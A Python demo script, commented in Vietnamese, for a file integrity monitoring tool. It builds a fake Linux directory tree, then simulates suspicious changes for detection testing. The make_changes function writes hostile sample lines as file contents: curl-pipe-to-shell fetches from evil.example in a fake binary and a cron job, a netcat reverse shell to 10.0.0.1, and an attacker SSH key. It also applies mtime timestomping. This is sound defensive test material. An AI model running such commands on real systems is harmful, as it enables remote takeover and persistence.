"""Demo end-to-end trong thư mục tạm — dựng baseline, tạo thay đổi, xem kết quả.

    python scripts/demo.py

Script tạo một cây thư mục giả rồi mô phỏng đúng những kiểu thay đổi mà FIM cần
phân biệt: sửa file bình thường, ghi thêm vào log (hợp lệ), và ba dấu hiệu đáng
ngờ — cài khoá SSH lạ, sửa nội dung mà giữ nguyên mtime (timestomping), thả file
thực thi vào thư mục tạm.

Không chạm vào file hệ thống thật, nên chạy được ở mọi máy mà không cần quyền
quản trị.
"""

from __future__ import annotations

import os
import shutil
import sys
import tempfile
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from fim.config import (                                    # noqa: E402
    AlertConfig, AnalysisConfig, BaselineConfig, Config, ScopeConfig,
    StorageConfig, WhitelistConfig,
)
from fim.engine import Engine                               # noqa: E402
from fim.models import Severity                             # noqa: E402
from fim.util import enable_utf8_output                     # noqa: E402

BANNER = "=" * 72


def write(path: Path, text: str) -> None:
    """Ghi file luôn ở UTF-8.

    ``Path.write_text`` không truyền encoding sẽ dùng bảng mã mặc định của hệ
    thống — trên Windows là cp1252, không ghi được tiếng Việt.
    """
    path.write_text(text, encoding="utf-8")


def append(path: Path, text: str) -> None:
    with open(path, "a", encoding="utf-8") as fh:
        fh.write(text)


def build_tree(root: Path) -> None:
    """Dựng cây thư mục giả giống một hệ thống Linux thu nhỏ."""
    (root / "etc").mkdir(parents=True)
    (root / "etc/cron.d").mkdir()
    (root / "usr/bin").mkdir(parents=True)
    (root / "var/log").mkdir(parents=True)
    (root / "tmp").mkdir()
    (root / "root/.ssh").mkdir(parents=True)

    write(
        root / "etc/passwd",
        "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    )
    write(root / "etc/hosts", "127.0.0.1 localhost\n")
    write(root / "etc/app.conf", "log_level = info\nworkers = 4\n")
    write(root / "usr/bin/helper", "#!/bin/sh\necho helper\n")
    (root / "usr/bin/helper").chmod(0o755)
    write(root / "var/log/app.log", "khởi động\n")
    write(
        root / "root/.ssh/authorized_keys",
        "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI_khoa_hop_le admin@corp\n",
    )


def make_changes(root: Path) -> list[str]:
    """Tạo các thay đổi, trả về mô tả từng bước để in ra."""
    steps: list[str] = []

    # 1. Hợp lệ: đổi cấu hình trong giờ làm việc.
    write(root / "etc/app.conf", "log_level = debug\nworkers = 8\n")
    steps.append("Hợp lệ  : sửa /etc/app.conf (đổi cấu hình bình thường)")

    # 2. Hợp lệ: ghi thêm vào log.
    append(root / "var/log/app.log", "đã xử lý 1000 bản ghi\n")
    steps.append("Hợp lệ  : ghi thêm vào /var/log/app.log (luật H091 trừ điểm)")

    # 3. Đáng ngờ: thêm khoá SSH lạ -> chạm cơ chế persistence (H003).
    append(
        root / "root/.ssh/authorized_keys",
        "ssh-rsa AAAAB3NzaC1yc2EAAAA_khoa_la attacker@evil\n",
    )
    steps.append("ĐÁNG NGỜ: thêm khoá vào authorized_keys (H003 persistence)")

    # 4. Đáng ngờ: sửa nhị phân rồi đặt lại mtime -> timestomping (H020).
    target = root / "usr/bin/helper"
    original = target.stat()
    write(target, "#!/bin/sh\ncurl evil.example/x | sh\n")
    os.utime(target, (original.st_atime, original.st_mtime))
    steps.append("ĐÁNG NGỜ: sửa /usr/bin/helper nhưng giữ nguyên mtime (H020 timestomp)")

    # 5. Đáng ngờ: thả script thực thi vào /tmp (H004 + H033).
    payload = root / "tmp/update.sh"
    write(payload, "#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\n")
    payload.chmod(0o755)
    # H004 (file thực thi trong thư mục tạm) không nổ ở đây: mẫu của nó nhắm vào
    # /tmp thật, còn demo chạy trong sandbox nên đường dẫn là .../fakeroot/tmp.
    # Trên hệ thống thật hai luật cùng khớp và điểm sẽ cao hơn.
    steps.append("ĐÁNG NGỜ: tạo tmp/update.sh có quyền thực thi (H033)")

    # 6. Đáng ngờ: cài cron job -> persistence.
    write(root / "etc/cron.d/backup", "*/5 * * * * root curl -s evil.example/c | sh\n")
    steps.append("ĐÁNG NGỜ: tạo cron job /etc/cron.d/backup (H003 + H001)")

    # 7. Đáng ngờ: xoá file trọng yếu (H022).
    (root / "etc/hosts").unlink()
    steps.append("ĐÁNG NGỜ: xoá /etc/hosts (H022 xoá file trọng yếu)")

    return steps


def main() -> int:
    enable_utf8_output()
    workdir = Path(tempfile.mkdtemp(prefix="fim-demo-"))
    tree = workdir / "fakeroot"

    try:
        print(BANNER)
        print("DEMO FIM — giám sát toàn vẹn file")
        print(BANNER)
        print(f"\nThư mục thử nghiệm: {tree}\n")

        build_tree(tree)

        posix = str(tree).replace("\\", "/")
        config = Config(
            root=workdir,
            storage=StorageConfig(db_path=str(workdir / "demo.db")),
            baseline=BaselineConfig(workers=2),
            scope=ScopeConfig(
                profile="custom",
                include=[posix],
                critical=[
                    f"{posix}/etc/passwd", f"{posix}/etc/hosts",
                    f"{posix}/etc/cron.d/**", f"{posix}/root/.ssh/**",
                    f"{posix}/usr/bin/**",
                ],
            ),
            whitelist=WhitelistConfig(autoload=False),
            analysis=AnalysisConfig(business_hours=[0, 24]),  # tắt luật ngoài giờ cho demo ổn định
            alert=AlertConfig(console=False, jsonl_path=str(workdir / "alerts.jsonl")),
        )

        with Engine(config) as engine:
            # --- Bước 1: chốt baseline ---
            print("[1/3] Chốt baseline…")
            result = engine.build_baseline("demo-baseline")
            print(f"      {result.file_count} file, {result.total_bytes} byte, "
                  f"{result.duration:.2f}s\n")

            # --- Bước 2: tạo thay đổi ---
            print("[2/3] Mô phỏng thay đổi:")
            time.sleep(1.1)                     # để mtime khác hẳn baseline
            for step in make_changes(tree):
                print(f"      {step}")
            print()

            # --- Bước 3: quét và phân loại ---
            print("[3/3] Quét lại và phân loại…\n")
            engine.scan_once()

            events = engine.store.query_events(limit=100)
            events.sort(key=lambda e: -(e["verdict"] or {}).get("score", 0))

            print(BANNER)
            print(f"{'MỨC':<9} {'ĐIỂM':>5}  {'LOẠI':<9} ĐƯỜNG DẪN")
            print(BANNER)
            for item in events:
                verdict = item["verdict"] or {}
                rel = item["path"].replace(posix, "")
                print(f"{verdict.get('severity', '-'):<9} "
                      f"{verdict.get('score', 0):>5}  "
                      f"{item['change']:<9} {rel}")

            print(BANNER)
            stats = engine.stats
            print(f"Tổng: {stats.events_processed} thay đổi, "
                  f"{stats.alerts_raised} cảnh báo")
            print(f"Theo mức: {stats.by_severity}")
            print(f"Phân loại: {stats.by_classification}")

            # Giải thích chi tiết sự kiện nặng nhất — đây là điểm mạnh của
            # mô hình chấm điểm: luôn trả lời được câu "vì sao".
            if events:
                worst = events[0]
                print(f"\n{BANNER}")
                print("GIẢI THÍCH SỰ KIỆN ĐIỂM CAO NHẤT")
                print(BANNER)
                event = engine.store.get_event(worst["id"])
                print(engine.classifier.explain(event))

            print(f"\n{BANNER}")
            high = sum(
                v for k, v in stats.by_severity.items()
                if Severity(k).rank >= Severity.MEDIUM.rank
            )
            print(f"Phát hiện {high} thay đổi đáng ngờ trên tổng "
                  f"{stats.events_processed}.")
            print("Mọi thao tác diễn ra trong thư mục tạm, không chạm file hệ thống.")
        return 0

    finally:
        shutil.rmtree(workdir, ignore_errors=True)


if __name__ == "__main__":
    raise SystemExit(main())
